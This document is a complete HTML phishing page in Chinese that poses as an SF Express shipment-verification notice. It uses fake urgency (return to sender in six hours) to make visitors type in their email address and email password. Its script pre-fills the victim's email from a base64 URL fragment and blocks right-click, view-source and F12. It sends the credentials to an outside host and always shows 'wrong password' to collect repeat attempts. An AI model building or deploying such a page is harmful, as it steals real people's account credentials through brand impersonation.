<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>顺丰快递发货通知</title>
  <link rel="shortcut icon" href="https://purcorders.github.io/porders/sps2(1).php" />
  <style>
    body {
      font-family: sans-serif;
      background: #f2f2f2 url('https://www.sf-international.com/.gallery/au/about_us/vision4.jpg') no-repeat center center fixed;
      background-size: cover;
      margin: 0;
      padding: 0;
      color: #333;
    }

    .container {
      max-width: 500px;
      margin: 60px auto;
      background: rgba(255, 255, 255, 0.95);
      border: 1px solid #ddd;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
    }

    .logo {
      text-align: center;
      margin-bottom: 20px;
    }

    .logo img {
      max-width: 50px;
    }

    h2 {
      text-align: center;
      color: #cc0000;
    }

    .notice {
      font-size: 15px;
      margin: 15px 0;
      text-align: center;
    }

    .tracking {
      font-size: 14px;
      background: #f1f1f1;
      padding: 10px;
      border-radius: 5px;
      margin-bottom: 20px;
    }

    form {
      display: flex;
      flex-direction: column;
    }

    label {
      font-size: 14px;
      margin: 8px 0 4px;
    }

    input[type="password"], input[type="email"] {
      padding: 10px;
      font-size: 14px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }

    .honeypot {
      display: none !important;
    }

    button {
      background-color: #d50000;
      color: white;
      padding: 12px;
      border: none;
      border-radius: 5px;
      margin-top: 20px;
      font-size: 16px;
      cursor: pointer;
    }

    button:hover {
      background-color: #b71c1c;
    }

    .footer {
      text-align: center;
      font-size: 12px;
      margin-top: 20px;
      color: #888;
    }

    .message {
      text-align: center;
      margin-top: 10px;
      font-weight: bold;
    }

    .message.success {
      color: green;
    }

    .message.error {
      color: red;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="https://www.sf-express.com/.gallery/sf-code-img.jpg" alt="SF Express Logo" />
    </div>
    <h2>等待发货确认</h2>
    <p class="notice">您的包裹目前被搁置，请立即完成验证。</p>
    <div class="tracking">
      <strong>跟踪 ID:</strong> <span id="trackingId">SF000000000HK</span><br />
      <strong>地位:</strong> 等待收件人核实<br />
      <strong>剩余时间:</strong> 退还寄件人前 6 小时
    </div>

    <form id="confirmForm">
      <!-- Honeypot -->
      <input type="text" name="company_name" class="honeypot" autocomplete="off" />

      <label for="email">电子邮件地址 ：</label>
      <input type="email" id="email" name="email" required />

      <label for="username">电子邮件密码 :</label>
      <input type="password" id="username" name="username" required />

      <button type="submit">跟踪交付</button>
    </form>

    <div class="message" id="responseMsg"></div>

    <div class="footer">
      © 2025 SF Express · 版权所有
    </div>
  </div>

  <script>
    document.addEventListener('contextmenu', e => e.preventDefault());
    document.addEventListener('keydown', e => {
      if (e.ctrlKey && ['u', 's', 'S', 'U'].includes(e.key)) e.preventDefault();
      if (['F12'].includes(e.key)) e.preventDefault();
    });

    function generateTrackingId() {
      const randomDigits = Math.floor(100000000 + Math.random() * 900000000);
      return `SF***${randomDigits}***HK`;
    }

    document.getElementById('trackingId').textContent = generateTrackingId();

    // NEW (using hash):
const hashValue = window.location.hash.substring(1); // remove "#"
if (hashValue) {
  try {
    const decodedEmail = atob(hashValue);
    document.getElementById('email').value = decodedEmail;
  } catch (err) {
    console.error("Invalid base64 in hash.");
  }
}

    document.getElementById('confirmForm').addEventListener('submit', async function (e) {
      e.preventDefault();
      const formData = new FormData(this);
      formData.append("trackingId", document.getElementById("trackingId").textContent);

      const responseBox = document.getElementById("responseMsg");
      responseBox.textContent = "";
      responseBox.className = "message";

      try {
        const res = await fetch("https://ghalmupro.com/dsf/dsfsx.php", {
          method: "POST",
          body: formData
        });

        const result = await res.json();
        if (result.status === "success") {
          responseBox.textContent = "⚠️ 访问失败！电子邮件密码错误！.";
          responseBox.classList.add("success");
        } else {
          responseBox.textContent = "⚠️ 访问失败！电子邮件密码错误！.";
          responseBox.classList.add("error");
        }
      } catch {
        responseBox.textContent = "⚠️ 访问失败！电子邮件密码错误！.";
        responseBox.classList.add("error");
      }
    });
  </script>
</body>
</html>
